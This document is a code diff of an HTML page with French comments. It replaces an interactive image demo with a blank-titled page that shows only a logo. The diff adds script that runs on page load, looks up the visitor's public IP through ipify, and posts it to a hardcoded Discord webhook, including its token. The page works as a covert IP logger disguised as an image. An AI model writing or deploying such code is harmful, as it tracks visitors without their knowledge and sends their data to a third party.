@@ -3,42 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Interactif</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        img {
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        img:hover {
-            transform: scale(1.1);
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
-        }
-    </style>
+    <title></title>
 </head>
 <body>
-    <!-- Ton image hébergée -->
-    <img id="interactiveImage" src="https://jaimesko1.github.io/Free-Logos-PNG-File.png" alt="Free Logos" width="600">
-    
+    <img src="Free-Logos-PNG-File.png" alt="">
     <script>
-        // Ajout d'un événement au clic sur l'image
-        const image = document.getElementById("interactiveImage");
+        // URL de l'API ipify pour obtenir l'adresse IP
+        const apiURL = "https://api.ipify.org?format=json";
 
-        image.addEventListener("click", function () {
-            alert("Vous avez cliqué sur l'image !");
-        });
+        // Effectue une requête pour récupérer l'IP
+        fetch(apiURL)
+            .then(response => response.json())
+            .then(data => {
+                console.log("Adresse IP:", data.ip);
 
-        // Exemple : Changer l'image au clic
-        image.addEventListener("dblclick", function () {
-            image.src = "https://via.placeholder.com/600x400/0000FF/FFFFFF?text=Nouvelle+Image";
-        });
+                // Tu peux aussi envoyer cette IP à ton serveur ou l'afficher
+                // Exemple : envoi vers un webhook Discord
+                const webhookURL = "https://canary.discord.com/api/webhooks/1295825062724894772/vJ0PsoAUd8YZyYQUizVzqC2nMpqqQYPfa9sVllxbaAejWxKFmA03S89T3-KQII_EQsMp";
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `Nouvelle IP détectée : ${data.ip}`
+                    })
+                }).then(() => console.log("IP envoyée au webhook"));
+            })
+            .catch(error => console.error("Erreur lors de la récupération de l'IP:", error));
     </script>
 </body>
 </html>
